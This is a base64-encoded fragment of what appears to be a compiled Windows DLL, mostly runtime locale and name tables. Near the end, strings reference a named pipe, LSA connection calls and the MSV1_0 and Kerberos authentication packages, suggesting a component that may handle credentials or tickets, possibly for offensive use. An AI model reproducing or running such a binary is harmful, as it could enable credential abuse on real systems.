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GIAZQAtAEIAWQAAAHMAbAAtAFMASQAAAGUAdAAtAEUARQAAAGwAdgAtAEwAVgAAAGwAdAAtAEwAVAAAAGYAYQAtAEkAUgAAAHYAaQAtAFYATgAAAGgAeQAtAEEATQAAAGEAegAtAEEAWgAtAEwAYQB0AG4AAAAAAGUAdQAtAEUAUwAAAG0AawAtAE0ASwAAAHQAbgAtAFoAQQAAAHgAaAAtAFoAQQAAAHoAdQAtAFoAQQAAAGEAZgAtAFoAQQAAAGsAYQAtAEcARQAAAGYAbwAtAEYATwAAAGgAaQAtAEkATgAAAG0AdAAtAE0AVAAAAHMAZQAtAE4ATwAAAG0AcwAtAE0AWQAAAGsAawAtAEsAWgAAAGsAeQAtAEsARwAAAHMAdwAtAEsARQAAAHUAegAtAFUAWgAtAEwAYQB0AG4AAAAAAHQAdAAtAFIAVQAAAGIAbgAtAEkATgAAAHAAYQAtAEkATgAAAGcAdQAtAEkATgAAAHQAYQAtAEkATgAAAHQAZQAtAEkATgAAAGsAbgAtAEkATgAAAG0AbAAtAEkATgAAAG0AcgAtAEkATgAAAHMAYQAtAEkATgAAAG0AbgAtAE0ATgAAAGMAeQAtAEcAQgAAAGcAbAAtAEUAUwAAAGsAbwBrAC0ASQBOAAAAAABzAHkAcgAtAFMAWQAAAAAAZABpAHYALQBNAFYAAAAAAHEAdQB6AC0AQgBPAAAAAABuAHMALQBaAEEAAABtAGkALQBOAFoAAABhAHIALQBJAFEAAABkAGUALQBDAEgAAABlAG4ALQBHAEIAAABlAHMALQBNAFgAAABmAHIALQBCAEUAAABpAHQALQBDAEgAAABuAGwALQBCAEUAAABuAG4ALQBOAE8AAABwAHQALQBQAFQAAABzAHIALQBTAFAALQBMAGEAdABuAAAAAABzAHYALQBGAEkAAABhAHoALQBBAFoALQBDAHkAcgBsAAAAAABzAGUALQBTAEUAAABtAHMALQBCAE4AAAB1AHoALQBVAFoALQBDAHkAcgBsAAAAAABxAHUAegAtAEUAQwAAAAAAYQByAC0ARQBHAAAAegBoAC0ASABLAAAAZABlAC0AQQBUAAAAZQBuAC0AQQBVAAAAZQBzAC0ARQBTAAAAZgByAC0AQwBBAAAAcwByAC0AUwBQAC0AQwB5AHIAbAAAAAAAcwBlAC0ARgBJAAAAcQB1AHoALQBQAEUAAAAAAGEAcgAtAEwAWQAAAHoAaAAtAFMARwAAAGQAZQAtAEwAVQAAAGUAbgAtAEMAQQAAAGUAcwAtAEcAVAAAAGYAcgAtAEMASAAAAGgAcgAtAEIAQQAAAHMAbQBqAC0ATgBPAAAAAABhAHIALQBEAFoAAAB6AGgALQBNAE8AAABkAGUALQBMAEkAAABlAG4ALQBOAFoAAABlAHMALQBDAFIAAABmAHIALQBMAFUAAABiAHMALQBCAEEALQBMAGEAdABuAAAAAABzAG0AagAtAFMARQAAAAAAYQByAC0ATQBBAAAAZQBuAC0ASQBFAAAAZQBzAC0AUABBAAAAZgByAC0ATQBDAAAAcwByAC0AQgBBAC0ATABhAHQAbgAAAAAAcwBtAGEALQBOAE8AAAAAAGEAcgAtAFQATgAAAGUAbgAtAFoAQQAAAGUAcwAtAEQATwAAAHMAcgAtAEIAQQAtAEMAeQByAGwAAAAAAHMAbQBhAC0AUwBFAAAAAABhAHIALQBPAE0AAABlAG4ALQBKAE0AAABlAHMALQBWAEUAAABzAG0AcwAtAEYASQAAAAAAYQByAC0AWQBFAAAAZQBuAC0AQwBCAAAAZQBzAC0AQwBPAAAAcwBtAG4ALQBGAEkAAAAAAGEAcgAtAFMAWQAAAGUAbgAtAEIAWgAAAGUAcwAtAFAARQAAAGEAcgAtAEoATwAAAGUAbgAtAFQAVAAAAGUAcwAtAEEAUgAAAGEAcgAtAEwAQgAAAGUAbgAtAFoAVwAAAGUAcwAtAEUAQwAAAGEAcgAtAEsAVwAAAGUAbgAtAFAASAAAAGUAcwAtAEMATAAAAGEAcgAtAEEARQAAAGUAcwAtAFUAWQAAAGEAcgAtAEIASAAAAGUAcwAtAFAAWQAAAGEAcgAtAFEAQQAAAGUAcwAtAEIATwAAAGUAcwAtAFMAVgAAAGUAcwAtAEgATgAAAGUAcwAtAE4ASQAAAGUAcwAtAFAAUgAAAHoAaAAtAEMASABUAAAAAABzAHIAAAAAAGEAZgAtAHoAYQAAAGEAcgAtAGEAZQAAAGEAcgAtAGIAaAAAAGEAcgAtAGQAegAAAGEAcgAtAGUAZwAAAGEAcgAtAGkAcQAAAGEAcgAtAGoAbwAAAGEAcgAtAGsAdwAAAGEAcgAtAGwAYgAAAGEAcgAtAGwAeQAAAGEAcgAtAG0AYQAAAGEAcgAtAG8AbQAAAGEAcgAtAHEAYQAAAGEAcgAtAHMAYQAAAGEAcgAtAHMAeQAAAGEAcgAtAHQAbgAAAGEAcgAtAHkAZQAAAGEAegAtAGEAegAtAGMAeQByAGwAAAAAAGEAegAtAGEAegAtAGwAYQB0AG4AAAAAAGIAZQAtAGIAeQAAAGIAZwAtAGIAZwAAAGIAbgAtAGkAbgAAAGIAcwAtAGIAYQAtAGwAYQB0AG4AAAAAAGMAYQAtAGUAcwAAAGMAcwAtAGMAegAAAGMAeQAtAGcAYgAAAGQAYQAtAGQAawAAAGQAZQAtAGEAdAAAAGQAZQAtAGMAaAAAAGQAZQAtAGQAZQAAAGQAZQAtAGwAaQAAAGQAZQAtAGwAdQAAAGQAaQB2AC0AbQB2AAAAAABlAGwALQBnAHIAAABlAG4ALQBhAHUAAABlAG4ALQBiAHoAAABlAG4ALQBjAGEAAABlAG4ALQBjAGIAAABlAG4ALQBnAGIAAABlAG4ALQBpAGUAAABlAG4ALQBqAG0AAABlAG4ALQBuAHoAAABlAG4ALQBwAGgAAABlAG4ALQB0AHQAAABlAG4ALQB1AHMAAABlAG4ALQB6AGEAAABlAG4ALQB6AHcAAABlAHMALQBhAHIAAABlAHMALQBiAG8AAABlAHMALQBjAGwAAABlAHMALQBjAG8AAABlAHMALQBjAHIAAABlAHMALQBkAG8AAABlAHMALQBlAGMAAABlAHMALQBlAHMAAABlAHMALQBnAHQAAABlAHMALQBoAG4AAABlAHMALQBtAHgAAABlAHMALQBuAGkAAABlAHMALQBwAGEAAABlAHMALQBwAGUAAABlAHMALQBwAHIAAABlAHMALQBwAHkAAABlAHMALQBzAHYAAABlAHMALQB1AHkAAABlAHMALQB2AGUAAABlAHQALQBlAGUAAABlAHUALQBlAHMAAABmAGEALQBpAHIAAABmAGkALQBmAGkAAABmAG8ALQBmAG8AAABmAHIALQBiAGUAAABmAHIALQBjAGEAAABmAHIALQBjAGgAAABmAHIALQBmAHIAAABmAHIALQBsAHUAAABmAHIALQBtAGMAAABnAGwALQBlAHMAAABnAHUALQBpAG4AAABoAGUALQBpAGwAAABoAGkALQBpAG4AAABoAHIALQBiAGEAAABoAHIALQBoAHIAAABoAHUALQBoAHUAAABoAHkALQBhAG0AAABpAGQALQBpAGQAAABpAHMALQBpAHMAAABpAHQALQBjAGgAAABpAHQALQBpAHQAAABqAGEALQBqAHAAAABrAGEALQBnAGUAAABrAGsALQBrAHoAAABrAG4ALQBpAG4AAABrAG8AawAtAGkAbgAAAAAAawBvAC0AawByAAAAawB5AC0AawBnAAAAbAB0AC0AbAB0AAAAbAB2AC0AbAB2AAAAbQBpAC0AbgB6AAAAbQBrAC0AbQBrAAAAbQBsAC0AaQBuAAAAbQBuAC0AbQBuAAAAbQByAC0AaQBuAAAAbQBzAC0AYgBuAAAAbQBzAC0AbQB5AAAAbQB0AC0AbQB0AAAAbgBiAC0AbgBvAAAAbgBsAC0AYgBlAAAAbgBsAC0AbgBsAAAAbgBuAC0AbgBvAAAAbgBzAC0AegBhAAAAcABhAC0AaQBuAAAAcABsAC0AcABsAAAAcAB0AC0AYgByAAAAcAB0AC0AcAB0AAAAcQB1AHoALQBiAG8AAAAAAHEAdQB6AC0AZQBjAAAAAABxAHUAegAtAHAAZQAAAAAAcgBvAC0AcgBvAAAAcgB1AC0AcgB1AAAAcwBhAC0AaQBuAAAAcwBlAC0AZgBpAAAAcwBlAC0AbgBvAAAAcwBlAC0AcwBlAAAAcwBrAC0AcwBrAAAAcwBsAC0AcwBpAAAAcwBtAGEALQBuAG8AAAAAAHMAbQBhAC0AcwBlAAAAAABzAG0AagAtAG4AbwAAAAAAcwBtAGoALQBzAGUAAAAAAHMAbQBuAC0AZgBpAAAAAABzAG0AcwAtAGYAaQAAAAAAcwBxAC0AYQBsAAAAcwByAC0AYgBhAC0AYwB5AHIAbAAAAAAAcwByAC0AYgBhAC0AbABhAHQAbgAAAAAAcwByAC0AcwBwAC0AYwB5AHIAbAAAAAAAcwByAC0AcwBwAC0AbABhAHQAbgAAAAAAcwB2AC0AZgBpAAAAcwB2AC0AcwBlAAAAcwB3AC0AawBlAAAAcwB5AHIALQBzAHkAAAAAAHQAYQAtAGkAbgAAAHQAZQAtAGkAbgAAAHQAaAAtAHQAaAAAAHQAbgAtAHoAYQAAAHQAcgAtAHQAcgAAAHQAdAAtAHIAdQAAAHUAawAtAHUAYQAAAHUAcgAtAHAAawAAAHUAegAtAHUAegAtAGMAeQByAGwAAAAAAHUAegAtAHUAegAtAGwAYQB0AG4AAAAAAHYAaQAtAHYAbgAAAHgAaAAtAHoAYQAAAHoAaAAtAGMAaABzAAAAAAB6AGgALQBjAGgAdAAAAAAAegBoAC0AYwBuAAAAegBoAC0AaABrAAAAegBoAC0AbQBvAAAAegBoAC0AcwBnAAAAegBoAC0AdAB3AAAAegB1AC0AegBhAAAAAAAAACgBARA0AQEQPAEBEEgBARBUAQEQYAEBEGwBARB4AQEQgAEBEIgBARCUAQEQoAEBEL8VARBYBgEQbAYBEIgGARCcBgEQvAYBEKwBARC0AQEQvAEBEMABARDEAQEQyAEBEMwBARDQAQEQ1AEBENgBARDkAQEQ6AEBEOwBARDwAQEQ9AEBEPgBARD8AQEQAAIBEAQCARAIAgEQDAIBEBACARAUAgEQGAIBEBwCARAgAgEQJAIBECgCARAsAgEQMAIBEDQCARA4AgEQPAIBEEACARBEAgEQSAIBEEwCARBQAgEQVAIBEFgCARBcAgEQYAIBEGwCARB4AgEQgAIBEIwCARCkAgEQsAIBEMQCARDkAgEQBAMBECQDARBEAwEQZAMBEIgDARCkAwEQyAMBEOgDARAQBAEQLAQBEDwEARBABAEQSAQBEFgEARB8BAEQhAQBEJAEARCgBAEQvAQBENwEARAEBQEQLAUBEFQFARCABQEQnAUBEMAFARDkBQEQEAYBEDwGARC/FQEQX19iYXNlZCgAAAAAX19jZGVjbABfX3Bhc2NhbAAAAABfX3N0ZGNhbGwAAABfX3RoaXNjYWxsAABfX2Zhc3RjYWxsAABfX2NscmNhbGwAAABfX2VhYmkAAF9fcHRyNjQAX19yZXN0cmljdAAAX191bmFsaWduZWQAcmVzdHJpY3QoAAAAIG5ldwAAAAAgZGVsZXRlAD0AAAA+PgAAPDwAACEAAAA9PQAAIT0AAFtdAABvcGVyYXRvcgAAAAAtPgAAKgAAACsrAAAtLQAALQAAACsAAAAmAAAALT4qAC8AAAAlAAAAPAAAADw9AAA+AAAAPj0AACwAAAAoKQAAfgAAAF4AAAB8AAAAJiYAAHx8AAAqPQAAKz0AAC09AAAvPQAAJT0AAD4+PQA8PD0AJj0AAHw9AABePQAAYHZmdGFibGUnAAAAYHZidGFibGUnAAAAYHZjYWxsJwBgdHlwZW9mJwAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgc3RyaW5nJwAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgc2NhbGFyIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAGB1ZHQgcmV0dXJuaW5nJwBgRUgAYFJUVEkAAABgbG9jYWwgdmZ0YWJsZScAYGxvY2FsIHZmdGFibGUgY29uc3RydWN0b3IgY2xvc3VyZScAIG5ld1tdAAAgZGVsZXRlW10AAABgb21uaSBjYWxsc2lnJwAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBtYW5hZ2VkIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGR5bmFtaWMgYXRleGl0IGRlc3RydWN0b3IgZm9yICcAAAAAYHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYHZlY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2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7/AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlae3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/0MATwBOAE8AVQBUACQAAAABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/AEEAAAAXAAAAZ2VuZXJpYwB1bmtub3duIGVycm9yAAAAaW9zdHJlYW0AAAAAaW9zdHJlYW0gc3RyZWFtIGVycm9yAAAAc3lzdGVtAABpbnZhbGlkIHN0cmluZyBwb3NpdGlvbgBzdHJpbmcgdG9vIGxvbmcAXABcAC4AXABwAGkAcABlAFwAcwBxAHMAdgBjAAAAAABFcnJvciBjYWxsaW5nIExzYUNvbm5lY3RVbnRydXN0ZWQuIEVycm9yIGNvZGU6IABoTFNBIChMU0EgaGFuZGxlKSBpcyBOVUxMLCB0aGlzIHNob3VsZG4ndCBldmVyIGhhcHBlbi4AAE1JQ1JPU09GVF9BVVRIRU5USUNBVElPTl9QQUNLQUdFX1YxXzAAAABLZXJiZXJvcwAAAABSZWNlaXZlZCBhbiBpbnZhbGlkIGF1dGggcGFja2FnZSBmcm9tIHRoZSBuYW1lZCBwaXBlAAAAAENhbGwgdG8gTHNhTG9va3VwQXV0aGV